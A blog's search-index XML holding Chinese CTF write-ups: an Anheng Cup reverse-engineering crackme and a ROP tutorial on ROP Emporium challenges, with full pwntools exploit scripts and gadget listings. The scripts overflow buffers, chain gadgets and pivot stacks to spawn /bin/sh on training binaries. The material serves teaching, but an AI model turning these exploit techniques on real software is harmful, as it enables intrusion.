<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[2019安恒杯1月月赛]]></title>
    <url>%2F2019%2F04%2F04%2F2019%E5%AE%89%E6%81%92%E6%9D%AF1%E6%9C%88%E6%9C%88%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[python_crackme（拿安恒杯1月月赛的题目she来讲）首先，你会拿到一个由python编译的exe文件，使用pyinstxtractor.py脚本（下载地址）反编译exe文件 得到一个文件夹里面有一大堆东西 用010editor打开与exe文件同名的二进制文件 添加上python3.6的.pyc文件的文件头（即前12字节）然后再加上后缀名.pyc 再在线反编译一下（反编译地址）即可得到python源码：1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python# encoding: utf-8# 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pycimport osn1 = input('Tell me your name?')n2 = input('Tell me your pasw')n11 = chr(ord(n1[0]) + 12)s = ''st3 = '51e'st2 = '9f1ff1e8b5b91110'st1 = 'c4e21c11a2412'st0 = 'wrong'if n11 + 'AnHeng' == n2: for i in range(0, 4): s += st1[3 - i] print('Congratulations') ts = st2[0] + st3 + st2[1] + s print('flag&#123;' + st3[:1] + st1 + st2 + st3[-2:] + '&#125;') os.system('pause')else: print('no,' + st0)import osn1 = input('Tell me your name?')n2 = input('Tell me your pasw')n11 = chr(ord(n1[0]) + 12)s = ''st3 = '51e'st2 = '9f1ff1e8b5b91110'st1 = 'c4e21c11a2412'st0 = 'wrong'if n11 + 'AnHeng' == n2: for i in range(0, 4): s += st1[3 - i] print('Congratulations') ts = st2[0] + st3 + st2[1] + s print('flag&#123;' + st3[:1] + st1 + st2 + st3[-2:] + '&#125;') os.system('pause')else: print('no,' + st0) old-diver32位pe文件，无壳 IDA分析：将v9的类型修改为char[]型，同时可以看到这里到401000处理的代码进行了加密异或，先解密一波：123456s = get_bytes(0x401000,0x260)buf = ''for i in s: buf += chr(ord(i)^0xbb)from idaapi import *patch_bytes(0x401000,buf) 重新构造解密部分函数，先undefine the current function（快捷键u）再 creat a function（快捷键p），重新F5，可以看到两个函数已经恢复正常 可以开始分析程序了第一步验证前5位：”flag{“然后进入sub_4010b0函数第二步异或 第三步：base64加密，”c19zbWNf”解码第四步：走迷宫 123456789-------- 上下左右g + + 2 a q w+ + ++ ++ + #+ ++ ++++ ++ ++++ ++ +--------waaaaawwwww22222qqqaaw 最终得到flag:flag{this_is_smc_waaaaawwwww22222qqqaaw}]]></content>
  </entry>
  <entry>
    <title><![CDATA[pwn入门之ROP]]></title>
    <url>%2F2019%2F04%2F04%2Fpwn%E5%85%A5%E9%97%A8%E4%B9%8BROP%2F</url>
    <content type="text"><![CDATA[ret2winROP Emporium 放到IDA很容易就找到溢出点123char s; // [esp+0h] [ebp-28h] 可以看出s距ebp的偏移量为0x28所以我们写入0x28正好可以写到ebp之前，要覆盖ebp还需要再写入4个字节（32位） 有一点值得引起注意，我们回车换行符同样会输入进去，明确溢出点以及可溢出的字节后接下来我们就开始构造rop，但在之前我们还应该检查一下程序开户了哪些保护，这决定了我们该采取何种rop攻击方式 exp 如下 ：123456from pwn import *sh = process('./ret2win32')ret2win32 = 0x08048659payload = 'A' * 0x28 + p32(0) + p32(ret2win32)sh.sendline(payload)sh.interactive() 64位的溢出点也一样exp:123456from pwn import *sh = process('./ret2win')ret2win = 0x400811payload = "A" * 0x20 + p64(0) + p64(ret2win)sh.sendline(payload)sh.interactive() split溢出点还是一样，不过少了可直接利用的函数，但是程序中提供了system函数和字符串”/bin/cat flag.txt”，同样ret到system并且通过栈传入”/bin/cat flag.txt”即可exp: 1234567from pwn import *sh = process('./split32')system = 0x08048657cat = 0x0804A030pyaload = 'A' * 0x28 + p32(0) + p32(system) + p32(cat)sh.sendline(pyaload)sh.interactive() 因为64位rdi是存储函数的第一个参数，所以我们需要pop rdi ;ret通过命令1ROPgadget --binary ./split --only &quot;pop|ret&quot; 找到gadget12345678910111213Gadgets information============================================================0x000000000040087c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040087e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400880 : pop r14 ; pop r15 ; ret0x0000000000400882 : pop r15 ; ret0x000000000040087b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040087f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004006b0 : pop rbp ; ret0x0000000000400883 : pop rdi ; ret0x0000000000400881 : pop rsi ; pop r15 ; ret0x000000000040087d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004005b9 : ret 64位exp:12345678from pwn import *sh = process('./split')system = 0x4005E0cat_flag = 0x601060pop = 0x400883payload = "A" * 0x20 + p64(0) + p64(pop) + p64(cat_flag) + p64(system)sh.sendline(payload)sh.interactive() callme溢出点还是一样，不过现在程序 没有system函数，flag也不是直接cat flag.txt得到，而是通过callme_one,callme_two,callme_three三个函数的调用计算得到，我们看一下.so文件 这里要求传入的三个参数为1，2，3，接下来写exp这里需要注意，因为要连续调用3个函数，所以需要注意callme_one调用完了之后的返回地址不能再向前两道一样随便写p32(0)了，这里是为了保持栈的平衡，callme_one执行完之后 要把它的三个参数1,2,3弹出去，esp才能指向p32(callme_two)12345678910111213from pwn import *sh = process('./callme32')pop3_ret = 0x80488a9callme_one = 0x080485C0callme_two = 0x08048620callme_three = 0x080485B0payload = ""payload += "a" * 0x28 + p32(0)payload += p32(callme_one) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)payload += p32(callme_two) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)payload += p32(callme_three) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)sh.sendline(payload)sh.interactive() 12345678payload += p32(callme_one) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)其中的pop3_ret 是为了把 p32(1) + p32(2) + p32(3)弹出栈，最后一个ret指令相当于pop eip也就是把栈顶的内容传给eip，从而改变执行流程，在执行完三次pop后，esp已经指向p32(callme_two)，这样就可以接着去指向第二段rop从而顺利调用callme_two(1,2,3)poppoppopret地址可以用objdump找到 如果对此不太好理解的话，可以进入gdb一步步跟着调试，可以看清楚具体的流程 只有将1，2，3pop出去esp才能指向callme_two。 64位程序 ，就不需要栈平衡了，在64位下，前6个参数通过rdi,rsi,rdx,rcx,r8,r9传递，所以需要找到pop rdi;pop rsi ;pop rdx ret 的gadget可以用 objdump -d callme | grep -A 3 pop找到 也可以用ROPgadget –binary ./callme –only “pop|ret”12345678910111213141516Gadgets information============================================================0x0000000000401b1c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401b1e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401b20 : pop r14 ; pop r15 ; ret0x0000000000401b22 : pop r15 ; ret0x0000000000401b1b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401b1f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000401900 : pop rbp ; ret0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret0x0000000000401b23 : pop rdi ; ret0x0000000000401ab2 : pop rdx ; ret0x0000000000401b21 : pop rsi ; pop r15 ; ret0x0000000000401ab1 : pop rsi ; pop rdx ; ret0x0000000000401b1d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004017d9 : ret exp:123456789101112131415161718from pwn import *sh = process('./callme')callme_one = 0x401850callme_two = 0x401870callme_three = 0x401810# pop_rdi = 0x401b23# pop_rsi_rdx = 0x401ab1pop_rdi_rsi_rdx_ret = 0x401ab0payload = ""payload += 'a' * 0x20 + p64(0)# payload += p64(pop_rdi) + p64(1) + p64(pop_rsi_rdx) + p64(2) + p64(3) + p64(callme_one)# payload += p64(pop_rdi) + p64(1) + p64(pop_rsi_rdx) + p64(2) + p64(3) + p64(callme_two)# payload += p64(pop_rdi) + p64(1) + p64(pop_rsi_rdx) + p64(2) + p64(3) + p64(callme_three)payload += p64(pop_rdi_rsi_rdx_ret) + p64(1) + p64(2) + p64(3) + p64(callme_one)payload += p64(pop_rdi_rsi_rdx_ret) + p64(1) + p64(2) + p64(3) + p64(callme_two)payload += p64(pop_rdi_rsi_rdx_ret) + p64(1) + p64(2) + p64(3) + p64(callme_three)sh.sendline(payload)sh.interactive() write4write432： 同样的溢出点，但是这次没有/bin/sh，需要我们自己写到data中或者bss 中，两种写法没什么不同，就改个地址而已，这里就只说写到data段中，“/bin/sh”在32位中需要分两次写到 data 中去，用ROPgadget 查找可用的gadget 先： 123这里用到 0x08048670 : mov dword ptr [edi], ebp ; ret0x080486da : pop edi ; pop ebp ; ret exp :1234567891011121314151617181920212223242526# -*- coding:UTF-8 -*-from pwn import *sh = process('./write432')data_addr = 0x0804A028 #写入到 data 段# bss_addr = 0x0804A040 #写入到 bss 段system_ply = 0x08048430pop_edi_ebp = 0x080486damov_edi_ebp = 0x08048670payload = ""payload += 0x28 * "A" + p32(0)payload += p32(pop_edi_ebp)# payload += p32(bss_addr)payload += p32(data_addr)payload += "/bin"payload += p32(mov_edi_ebp)payload += p32(pop_edi_ebp)# payload += p32(bss_addr + 4)payload += p32(data_addr + 4)payload += "/sh\x00"payload += p32(mov_edi_ebp)payload += p32(system_ply)payload += p32(0)# payload += p32(bss_addr)payload += p32(data_addr)sh.sendline(payload)sh.interactive() write4:一样的思路，只不过在写入data的时候64位可以一次写入12345678910111213141516171819202122# -*- coding:UTF-8 -*-from pwn import *sh = process('./write4')# bss_addr = 0x0000000000601060 #写入到 bss 段data_addr = 0x0000000000601050 #写入到 data 段mov_r14_r15 = 0x0000000000400820pop_r14_r15 = 0x0000000000400890system_plt = 0x00000000004005E0pop_rdi = 0x0000000000400893payload = ""payload += 0x20 * "A" + p64(0)payload += p64(pop_r14_r15)payload += p64(data_addr)# payload += p64(bss_addr)payload += "/bin/sh\x00"payload += p64(mov_r14_r15)payload += p64(pop_rdi)# payload += p64(bss_addr)payload += p64(data_addr)payload += p64(system_plt)sh.sendline(payload)sh.interactive() badchars这次的程序对输入的字符进行了过滤,对于特定字符b,i,c/ &lt;空格&gt;,f,n.s，会被替换成-21，当然这会对我们成功写入”/bin/sh\x00”造成影响，所以我们要绕过这步替换12345678910111213141516171819202122232425 v3[0] = 'b'; v3[1] = 'i'; v3[2] = 'c'; v3[3] = '/'; v3[4] = ' '; v3[5] = 'f'; v3[6] = 'n'; v3[7] = 's'; j = 0LL; for ( i = 0LL; ; ++i ) &#123; result = i; if ( i &gt;= a2 ) break; for ( j = 0LL; j &lt;= 7; ++j ) &#123; if ( *(a1 + i) == v3[j] ) &#123; *(a1 + i) = -21; break; &#125; &#125; &#125; return result;&#125; 可以用xor将 “/bin/sh\x00”先进行加密，成功写入后再解密进行传参，先来找一下可以异或的数字：12345678910111213141516binsh = "/bin/sh\x00"badchar = [98, 105, 99, 47, 32, 102, 110, 115]# for i in badchar:# print chr(i)xornum = 1while 1: for x in binsh: tem = ord(x) ^ xornum if tem in badchar: xornum += 1 break if x == "\x00": print xornum xornum += 1 if xornum == 10: break 找到2，3，5，9，接下来查找一下gadget123456789101112131415161718192021$ ROPgadget --binary ./badchars32 --only &quot;mov|pop|ret|xor&quot;Gadgets information============================================================0x08048607 : mov al, byte ptr [0xc9010804] ; ret0x08048893 : mov dword ptr [edi], esi ; ret0x08048570 : mov ebx, dword ptr [esp] ; ret0x080488fb : pop ebp ; ret0x08048896 : pop ebx ; pop ecx ; ret0x080488f8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x08048461 : pop ebx ; ret0x08048897 : pop ecx ; ret0x080488fa : pop edi ; pop ebp ; ret0x0804889a : pop edi ; ret0x080488f9 : pop esi ; pop edi ; pop ebp ; ret0x08048899 : pop esi ; pop edi ; ret0x0804844a : ret0x0804885e : ret 0xd750x080485be : ret 0xeac10x08048890 : xor byte ptr [ebx], cl ; retUnique gadgets found: 16 因为32位程序一次只能传4个字符，所以需要分两次传exp:123456789101112131415161718192021222324252627282930313233343536# -*- coding:UTF-8 -*-from pwn import *sh = process('./badchars32')sysetm_plt = 0x080484E0binsh = "/bin/sh\x00"xorbinsh = ""#加密for i in binsh: xorbinsh += chr(ord(i) ^ 2)mov_edi_esi = 0x08048893pop_esi_edi = 0x08048899pop_ebx_ecx = 0x08048896xor_ebx_cl = 0x08048890bss_addr = 0x0804A044payload = ""payload += 0x28 * "A" + p32(0)#分两次传payload += p32(pop_esi_edi)payload += xorbinsh[0:4]payload += p32(bss_addr)payload += p32(mov_edi_esi)payload += p32(pop_esi_edi)payload += xorbinsh[4:8]payload += p32(bss_addr + 4)payload += p32(mov_edi_esi)#解密for x in range(0,len(xorbinsh)): payload += p32(pop_ebx_ecx) payload += p32(bss_addr + x) + p32(2) payload += p32(xor_ebx_cl)payload += p32(sysetm_plt) + p32(0) + p32(bss_addr)sh.sendline(payload)sh.interactive() 64位程序 ：一样的思路，先查一下gadget :1234567891011121314151617181920212223242526272829$ ROPgadget --binary ./badchars --only &quot;mov|pop|ret|xor&quot;Gadgets information============================================================0x0000000000400853 : mov byte ptr [rip + 0x20084e], 1 ; ret0x0000000000400b35 : mov dword ptr [rbp], esp ; ret0x00000000004008ee : mov eax, 0 ; pop rbp ; ret0x0000000000400a3b : mov eax, dword ptr [rbp - 8] ; pop rbp ; ret0x0000000000400b34 : mov qword ptr [r13], r12 ; ret0x0000000000400a3a : mov rax, qword ptr [rbp - 8] ; pop rbp ; ret0x0000000000400bac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400b3b : pop r12 ; pop r13 ; ret0x0000000000400bae : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400b3d : pop r13 ; ret0x0000000000400b40 : pop r14 ; pop r15 ; ret0x0000000000400b42 : pop r15 ; ret0x0000000000400852 : pop rbp ; mov byte ptr [rip + 0x20084e], 1 ; ret0x0000000000400bab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400baf : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004007f0 : pop rbp ; ret0x0000000000400b39 : pop rdi ; ret0x0000000000400b41 : pop rsi ; pop r15 ; ret0x0000000000400bad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400b3c : pop rsp ; pop r13 ; ret0x00000000004006b1 : ret0x0000000000400aad : ret 0x10750x0000000000400b30 : xor byte ptr [r15], r14b ; ret0x0000000000400b31 : xor byte ptr [rdi], dh ; retUnique gadgets found: 24 64位程序就可以一次传进去exp:12345678910111213141516171819202122232425262728293031# -*- coding:UTF-8 -*-from pwn import *sh = process('./badchars')binsh = "/bin/sh\x00"xorbinsh = ""#加密for i in binsh: xorbinsh += chr(ord(i) ^ 2)bss_addr = 0x0000000000601080system_plt = 0x00000000004006F0mov_r13_r12_ret = 0x0000000000400b34pop_r12_r13_ret = 0x0000000000400b3bxor_r15_r14_ret = 0x0000000000400b30pop_r14_r15_ret = 0x0000000000400b40pop_rdi_ret = 0x0000000000400b39payload = ""payload += 0x28 * "A"#一次传入payload += p64(pop_r12_r13_ret)payload += xorbinshpayload += p64(bss_addr)payload += p64(mov_r13_r12_ret)#解密 for i in range(0,len(xorbinsh)): payload += p64(pop_r14_r15_ret) payload += p64(2) + p64(bss_addr + i) payload += p64(xor_r15_r14_ret)payload += p64(pop_rdi_ret) + p64(bss_addr) + p64(system_plt)sh.sendline(payload)sh.interactive() fluff题目的设置跟前面的题还是一样没什么变化，查一波gadget，会发现在这次的写入没之前的那么顺利12345678910111213141516171819202122232425262728293031$ ROPgadget --binary ./fluff32 --only &quot;mov|pop|ret|xor|xchg&quot;Gadgets information============================================================0x08048547 : mov al, byte ptr [0xc9010804] ; ret0x08048709 : mov dword ptr [0x81fffffd], eax ; ret0x08048693 : mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret0x08048674 : mov ebp, 0xcafebabe ; ret0x080484b0 : mov ebx, dword ptr [esp] ; ret0x0804867e : mov edi, 0xdeadbabe ; ret0x0804868c : mov edx, 0xdefaced0 ; ret0x0804867d : pop ebp ; mov edi, 0xdeadbabe ; ret0x0804868b : pop ebp ; mov edx, 0xdefaced0 ; ret0x08048695 : pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret0x080486fb : pop ebp ; ret0x080486f8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x080483e1 : pop ebx ; ret0x08048696 : pop ebx ; xor byte ptr [ecx], bl ; ret0x08048692 : pop edi ; mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret0x080486fa : pop edi ; pop ebp ; ret0x08048670 : pop edi ; xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret0x08048673 : pop esi ; mov ebp, 0xcafebabe ; ret0x080486f9 : pop esi ; pop edi ; pop ebp ; ret0x0804867a : pop esi ; xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret0x080483ca : ret0x080484fe : ret 0xeac10x08048689 : xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret0x08048697 : xor byte ptr [ecx], bl ; ret0x0804867b : xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret0x08048671 : xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; retUnique gadgets found: 26 因为没有mov可以直接写入，这里我们可以用xor进行写入操作，用一个xor操作清空寄存器A，再通过 xor A,B就可以将B寄存器的内容写入到寄存器A中去。这道题就是巧秒得利用了xor来进行写入。exp:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# -*- coding:UTF-8 -*-from pwn import *context.log_level = "debug"sh = process('./fluff32')binsh = "/bin/sh\x00"system_plt = 0x08048430data_addr = 0x0804A028#mov_ecx_edx;pop_ebp;pop_ebx;xor_ecx_bl;retgadget1 = 0x08048693#xor_edx_edx;pop_esi;mov_ebp_0xcafebabe;ret 亦或自身gadget2 = 0x08048671#xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; retgadget3 = 0x0804867bpop_ebx = 0x080483e1#xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; retgadget4 = 0x08048689junk = "A" * 4payload = ""payload += 0x28 * "A" + junkpayload += p32(gadget2) + p32(0) #xor_edx_edx (edx = 0)payload += p32(pop_ebx) + p32(data_addr)payload += p32(gadget3) + p32(0) #(edx = data_addr,pop_ebp,mov)payload += p32(gadget4) + p32(0) #ecx = data_addrpayload += p32(pop_ebx) payload += "/bin"payload += p32(gadget2) + p32(0) #xor_edx_edx (edx = 0)payload += p32(gadget3) + p32(0) #(edx = "/bin",pop_ebp,mov)#"/bin"放到data中去payload += p32(gadget1) + p32(0) + p32(0)payload += p32(pop_ebx) + p32(data_addr + 4)payload += p32(gadget2) + p32(0) #xor_edx_edx (edx = 0)payload += p32(gadget3) + p32(0) #(edx = data_addr,pop_ebp,mov)payload += p32(gadget4) + p32(0) #ecx = data_addr + 4payload += p32(pop_ebx) payload += "/sh\x00"payload += p32(gadget2) + p32(0) #xor_edx_edx (edx = 0)payload += p32(gadget3) + p32(0) #(edx = "/bin",pop_ebp,mov)#"xsh\x00"放到data中去payload += p32(gadget1) + p32(0) + p32(0)payload += p32(system_plt) + p32(0) + p32(data_addr)sh.sendline(payload)sh.interactive() 64位程序 ：这里需要注意一下在查gadget的时候，可能会出现找不到想要的gadget，可以加上参数 –depth 20，（20是深度最深的情况了）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152$ ROPgadget --binary fluff --only &quot;mov|pop|ret|xor|xchg&quot; --depth 20Gadgets information============================================================0x0000000000400713 : mov byte ptr [rip + 0x20096e], 1 ; ret0x000000000040084f : mov dword ptr [rdx], ebx ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret0x00000000004007ae : mov eax, 0 ; pop rbp ; ret0x0000000000400835 : mov ebp, 0x604060 ; ret0x0000000000400846 : mov ebx, 0x602050 ; ret0x0000000000400827 : mov edi, 0x601050 ; ret0x000000000040083b : mov edi, 0x601050 ; xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret0x000000000040084e : mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret0x0000000000400845 : mov r11d, 0x602050 ; ret0x0000000000400834 : mov r13d, 0x604060 ; ret0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret0x00000000004008bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400853 : pop r12 ; xor byte ptr [r10], r12b ; ret0x0000000000400851 : pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret0x00000000004008be : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400825 : pop r14 ; mov edi, 0x601050 ; ret0x00000000004008c0 : pop r14 ; pop r15 ; ret0x000000000040082d : pop r14 ; xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret0x000000000040084c : pop r15 ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret0x0000000000400843 : pop r15 ; mov r11d, 0x602050 ; ret0x00000000004008c2 : pop r15 ; ret0x0000000000400820 : pop r15 ; xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret0x0000000000400712 : pop rbp ; mov byte ptr [rip + 0x20096e], 1 ; ret0x00000000004008bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400852 : pop rbp ; pop r12 ; xor byte ptr [r10], r12b ; ret0x00000000004008bf : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004006b0 : pop rbp ; ret0x00000000004008ba : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040084d : pop rdi ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret0x0000000000400844 : pop rdi ; mov r11d, 0x602050 ; ret0x00000000004008c3 : pop rdi ; ret0x0000000000400821 : pop rdi ; xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret0x0000000000400826 : pop rsi ; mov edi, 0x601050 ; ret0x00000000004008c1 : pop rsi ; pop r15 ; ret0x000000000040082e : pop rsi ; xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret0x0000000000400833 : pop rsp ; mov r13d, 0x604060 ; ret0x00000000004008bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400854 : pop rsp ; xor byte ptr [r10], r12b ; ret0x00000000004005b9 : ret0x0000000000400841 : xchg ebx, edx ; pop r15 ; mov r11d, 0x602050 ; ret0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret0x0000000000400855 : xor byte ptr [r10], r12b ; ret0x0000000000400856 : xor byte ptr [rdx], ah ; ret0x0000000000400823 : xor ebx, ebx ; pop r14 ; mov edi, 0x601050 ; ret0x0000000000400830 : xor ebx, esp ; pop r12 ; mov r13d, 0x604060 ; ret0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; retUnique gadgets found: 47 exp:1234567891011121314151617181920212223242526272829303132333435363738from pwn import *sh = process('./fluff')binsh = "/bin/sh\x00"system_plt = 0x00000000004005E0data_addr = 0x0000000000601050pop_rdi = 0x00000000004008c3#mov r10, r11 ; pop r13 ; pop r12 ; xor r10, r12 ; retgadget1 = 0x000000000040084e#pop r15 ; mov r10, r11 ; pop r13 ; pop r12 ; xor r10, r12 ; retgadget2 = 0x000000000040084c#xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; retgadget3 = 0x0000000000400822#xor r11, r12 ; pop r12 ; mov r13, 0x604060 ; retgadget4 = 0x000000000040082f#xchg r11, r10 ; pop r15 ; mov r11, 0x602050 ; retgadget5 = 0x0000000000400840#pop r12 ; pop r13 ; pop r14 ; pop r15 ; retgadget6 = 0x00000000004008bcpayload = ""payload += 0x20 * "A" + p64(0)#将 data_addr 写入r10payload += p64(gadget6) + p64(data_addr) +p64(3) + p64(4) + p64(5)payload += p64(gadget3) + p64(4)payload += p64(gadget4) + binshpayload += p64(gadget5) + p64(5)#将"/bin/sh\x00" 写入r11payload += p64(gadget6) + binsh +p64(3) + p64(4) + p64(5)payload += p64(gadget3) + p64(4)payload += p64(gadget4) + binsh#data_addr = "/bin/sh\x00"payload += p64(gadget1) + p64(3) + p64(0)payload += p64(pop_rdi) + p64(data_addr) + p64(system_plt)sh.sendline(payload)sh.interactive() pivot这道题有两次输入，第一次输入到堆中，第二次输入到栈中，而且很明显第二次的可溢出大小不够用来构造rop链，所以我们需要将rop链构造在堆中，然后利用栈迁移来执行rop链。题目中也将堆的地址打印了出来 ，降低了不少难度。给出的.so文件有这个函数可以用： 12345void __noreturn ret2win()&#123; system("/bin/cat flag.txt"); exit(0);&#125; 显然我们构造的rop链要能够控制程序跳转到这个函数去执行，这里需要用到计算偏移elf函数中只有foothold_function在.so中也出现，而且也在got表中，所以ret2win的真实地址可以结合foothold_function算出来，这里需要注意的是，需要先将foothold_function函数调用一次，got表中才有foothold_function的真实地址。这里说一下我踩过的坑，偏移有两种算法：1、真实地址-libc地址2、两个licb函数地址相减一开始我用第一种方法算偏移，理论上来说两种方法都没错，但是因为函数需要调用一次后才能在got表中有真实地址，所以直接拿got表中的地址来当真实地址的错的，所以最好使用第二种方法算偏移，然后在构造rop的时候将其中的一个地址调用一次使得got表中有它的真实地址再拿去加偏移就能得到目标函数的真实地址。exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *sh = process('./pivot32')elf = ELF('./pivot32')libc = ELF('./libpivot32.so')foothold_plt = elf.plt['foothold_function']foothold_got_plt = elf.got['foothold_function']foothold_sym = libc.symbols['foothold_function']ret2win = libc.symbols['ret2win']# offset = int(foothold_got_plt - foothold_sym) 这里就是直接用got表的地址去算偏移，其实是错的，因为foothold_function函数没有调用过，got表中并不是真实地址# offset = int(ret2win - foothold_sym)offset = ret2win - foothold_sym#offset = foothold_sym - ret2win 这里算偏移的时候要注意结果不能为负数 sh.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ")leakaddr = int(sh.recv(10),16) #接收题目打印出来的堆地址print hex(leakaddr) pause()add_eax_ebx = 0x080488c7mov_eax_eax = 0x080488c4pop_eax = 0x080488c0pop_ebx = 0x08048571call_eax = 0x080486a3leave_ret = 0x080486a8payload_1 = ""payload_1 += p32(foothold_plt) #将foothold_function函数调用一次payload_1 += p32(pop_eax)payload_1 += p32(foothold_got_plt) #上面调用了一次这里就是真实地址了payload_1 += p32(mov_eax_eax)payload_1 += p32(pop_ebx)payload_1 += p32(offset)payload_1 += p32(add_eax_ebx)payload_1 += p32(call_eax)sh.sendline(payload_1)payload_2 = ""payload_2 += 0x28 * "A"payload_2 += p32(leakaddr-4) + p32(leave_ret)sh.sendline(payload_2)sh.interactive() 64位exp:1234567891011121314151617181920212223242526272829303132333435363738from pwn import *sh = process('./pivot')elf = ELF('./pivot')so = ELF('./libpivot.so')foothold_plt = elf.plt['foothold_function']foothold_got_plt = elf.got['foothold_function']footold_sym = so.symbols['foothold_function']ret2win_sym = so.symbols['ret2win']offset = ret2win_sym - footold_symsh.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ")addr = int(sh.recv(14),16)print hex(addr)pause()mov_rax_rax = 0x0000000000400b05 add_rax_rbp = 0x0000000000400b09pop_rax = 0x0000000000400b00pop_rbp = 0x0000000000400900pop_rdi = 0x0000000000400b73call_rax = 0x000000000040098e# pop_rsp_r13_r14_r15_ret = 0x0000000000400b6dxchg_rax_rsp = 0x0000000000400b02sh.recvuntil("&gt; ")payload_1 = ""payload_1 += p64(foothold_plt)payload_1 += p64(pop_rax) + p64(foothold_got_plt)payload_1 += p64(mov_rax_rax)payload_1 += p64(pop_rbp) + p64(offset)payload_1 += p64(add_rax_rbp)payload_1 += p64(call_rax)sh.sendline(payload_1)sh.recvuntil("&gt; ")payload_2 = ""payload_2 += 0x28*"A"payload_2 += p64(pop_rax) + p64(addr) + p64(xchg_rax_rsp)# payload_2 += p64(pop_rsp_r13_r14_r15_ret) + p64(addr) + p64(3) + p64(4) + p64(5)sh.sendline(payload_2)sh.interactive() ret2csu先checksec一波，no canry ,no pie 从IDA可以看到程序存在栈溢出漏洞和一个后门函数 但是这个后门函数需要三个参数，a1,a2随意，a3需要为0xdeadcafebabebeef,找一下gadget 并没有如pop rdx , mov rdx的gadget，这个时候，我们可以利用__libc_csu_init中的gadget 可以控制 r15,r14,r13的值 来达到控制 rdx,rsi,rdi的目的，这里因为有一个坑，setvbuf函数在调用的时候会将rdx赋值为0xffffffff,这样的话就不能成功调用ret2win了，所以找一个初始化函数调用一下exp: 12345678910111213141516171819202122232425262728#-*-coding:utf-8-*-from pwn import *p = process('./ret2csu')context.log_level = 'debug'init = 0x600E10 #初始化函数地址rop_1 = 0x400880rop_2 = 0x40089aret2win = 0x4007B1payload = 0x20*'a'payload += p64(0) #rbppayload += p64(rop_2)payload += p64(0) #rbxpayload += p64(1) #rbppayload += p64(init) #r12payload += p64(0) #r13payload += p64(0) #r14payload += p64(0xdeadcafebabebeef) #r15payload += p64(rop_1)payload += p64(0) #add rsp,8可以理解为pop操作，但是没有pop到寄存器，而有丢弃掉payload += p64(0) #rbxpayload += p64(0) #rbppayload += p64(0) #r12payload += p64(0) #r13payload += p64(0) #r14payload += p64(0) #r15payload += p64(ret2win)p.sendline(payload)p.interactive()]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hitcon-Training lab1~lab9]]></title>
    <url>%2F2019%2F04%2F04%2FHitcon-Training%2F</url>
